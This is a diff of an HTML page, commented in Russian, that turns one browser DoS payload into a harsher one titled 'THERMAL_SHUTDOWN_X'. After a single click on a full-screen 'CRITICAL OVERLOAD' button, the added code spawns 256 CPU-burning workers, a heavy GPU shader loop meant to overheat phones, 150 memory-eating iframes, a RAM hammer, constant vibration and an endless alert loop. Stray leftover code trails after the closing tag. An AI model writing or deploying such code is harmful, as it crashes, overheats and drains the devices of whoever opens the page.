@@ -2,92 +2,92 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>SDRAGON TERMINATOR</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>THERMAL_SHUTDOWN_X</title>
     <style>
-        body { margin: 0; background: #000; overflow: hidden; }
-        canvas { width: 100%; height: 100%; position: fixed; }
-        #trigger { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            z-index: 999; display: flex; align-items: center; justify-content: center;
-            background: rgba(0,0,0,0.8); color: white; font: bold 24px sans-serif;
-        }
+        body, html { margin: 0; padding: 0; background: #000; overflow: hidden; width: 100%; height: 100%; }
+        #x { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; 
+             background: #f00; color: #fff; display: flex; align-items: center; 
+             justify-content: center; font: bold 40px sans-serif; cursor: pointer; }
     </style>
 </head>
 <body>
-    <div id="trigger">TOUCH TO DESTROY</div>
-    <canvas id="c"></canvas>
+    <div id="x" onclick="halt()">CRITICAL OVERLOAD</div>
 
     <script>
-        const canvas = document.getElementById('c');
-        const gl = canvas.getContext('webgl');
+        function halt() {
+            document.getElementById('x').style.display = 'none';
 
-        function singularity() {
-            // 1. МГНОВЕННЫЙ ЦИКЛ ПЕРЕПОЛНЕНИЯ (1мс дедлайн)
-            const startTime = performance.now();
-            
-            // Нагрузка на шину памяти и кэш
-            let i = 0;
-            while (performance.now() - startTime < 1) { 
-                // Создаем тяжелые объекты в микро-цикле
-                let chunk = new Float64Array(1024 * 10);
-                window.crypto.getRandomValues(chunk); // Напрягаем аппаратный генератор чисел
-                i++;
+            // 1. Аппаратная нагрузка: Шина памяти + CPU (256 потоков)
+            const wCode = `
+                setInterval(() => {
+                    let a = new Float64Array(1024 * 1024 * 2);
+                    for(let i=0; i<a.length; i++) { a[i] = Math.sqrt(Math.tan(Math.atan(Math.random()))); }
+                    postMessage(a); 
+                }, 0);
+            `;
+            const wUrl = URL.createObjectURL(new Blob([wCode], {type: 'text/javascript'}));
+            for(let i=0; i<256; i++) {
+                let w = new Worker(wUrl);
+                w.onmessage = (e) => { let b = e.data; }; // Заставляем данные летать между потоками
             }
 
-            // 2. РЕКУРСИВНЫЙ ПЕРЕЗАПУСК (Мгновенно)
-            // Использование multiple сетов гарантирует, что очередь событий забьется быстрее, чем очистится
-            setTimeout(singularity, 0);
-            setTimeout(singularity, 0); 
-            Promise.resolve().then(singularity);
-        }
-
-        function startGPU() {
+            // 2. GPU Thermal Kill (Raymarching 2048 итераций)
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl', {antialias:false, powerPreference: "high-performance"});
             const vs = gl.createShader(gl.VERTEX_SHADER);
             gl.shaderSource(vs, 'attribute vec2 p; void main(){gl_Position=vec4(p,0,1);}');
             gl.compileShader(vs);
-
             const fs = gl.createShader(gl.FRAGMENT_SHADER);
-            // 1024 итерации — это гарантированный перегрев Adreno 725
-            gl.shaderSource(fs, `
-                precision highp float;
-                uniform float t;
-                void main(){
-                    vec2 uv = gl_FragCoord.xy / 256.0;
-                    vec3 c = vec4(0).rgb;
-                    for(int i=0; i<1024; i++){ 
-                        uv = abs(uv) / dot(uv,uv) - 1.1;
-                        c += 0.0005 / length(uv);
-                    }
-                    gl_FragColor = vec4(c, 1.0);
-                }
-            `);
+            gl.shaderSource(fs, 'precision highp float; uniform float t; void main(){ vec2 uv=gl_FragCoord.xy/64.0; vec3 c=vec3(0); for(int i=0; i<2048; i++){ uv=abs(uv)/dot(uv,uv)-0.7; c+=0.0001/length(uv); } gl_FragColor=vec4(c*vec3(1.0,0.5,0.2),1.0); }');
             gl.compileShader(fs);
-
-            const p = gl.createProgram();
-            gl.attachShader(p, vs); gl.attachShader(p, fs);
-            gl.linkProgram(p); gl.useProgram(p);
-
-            const b = gl.createBuffer();
-            gl.bindBuffer(gl.ARRAY_BUFFER, b);
-            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
-            const a = gl.getAttribLocation(p, 'p');
-            gl.enableVertexAttribArray(a);
-            gl.vertexAttribPointer(a, 2, gl.FLOAT, false, 0, 0);
-
-            function render() {
-                gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
-                // Принудительная синхронизация GPU и CPU (самый мощный лаг)
-                gl.finish(); 
-                requestAnimationFrame(render);
-            }
-            render();
-        }
-
-        document.getElementById('trigger').onclick = function() {
-            this.style.display = 'none';
+            const pr = gl.createProgram();
+            gl.attachShader(pr,vs); gl.attachShader(pr,fs); gl.linkProgram(pr); gl.useProgram(pr);
             
-            // Запуск "Белого шума" для удержания фона
-            const ac = new AudioContext();
+            function thermal() {
+                gl.drawArrays(gl.POINTS, 0, 1);
+                gl.finish(); // Ждем завершения рендера CPU потоком
+                gl.readPixels(0,0,1,1,gl.RGBA,gl.UNSIGNED_BYTE,new Uint8Array(4)); // Принудительный Sync
+                queueMicrotask(thermal);
+            }
+            thermal();
+
+            // 3. Iframe Recursion (Multi-Process Explosion)
+            const ifCode = `
+                <script>
+                    setInterval(() => {
+                        let l = []; for(let i=0; i<100; i++) l.push(new Uint8Array(1024*1024*5));
+                    }, 1);
+                    // Рекурсивный запуск шейдеров в каждом iframe
+                <\/script>
+            `;
+            const ifUrl = URL.createObjectURL(new Blob([ifCode], {type: 'text/html'}));
+            for(let i=0; i<150; i++) {
+                const ifr = document.createElement('iframe');
+                ifr.src = ifUrl;
+                document.body.appendChild(ifr);
+            }
+
+            // 4. Memory Hammer (Забиваем RAM до предела OOM Killer)
+            let m = [];
+            setInterval(() => {
+                for(let i=0; i<500; i++) m.push(new BigInt64Array(1000000));
+            }, 1);
+
+            // 5. Вибрация и WakeLock (Максимальный ток аккумулятора)
+            setInterval(() => {
+                if(navigator.vibrate) navigator.vibrate(10000);
+            }, 10);
+            
+            // 6. Бесконечные алерты (Блокировка UI-потока системы)
+            setTimeout(() => {
+                while(true) { alert("SYSTEM_FAILURE_THERMAL_CRITICAL"); }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
+const ac = new AudioContext();
             const osc = ac.createOscillator();
             const g = ac.createGain();
             g.gain.value = 0.0001;
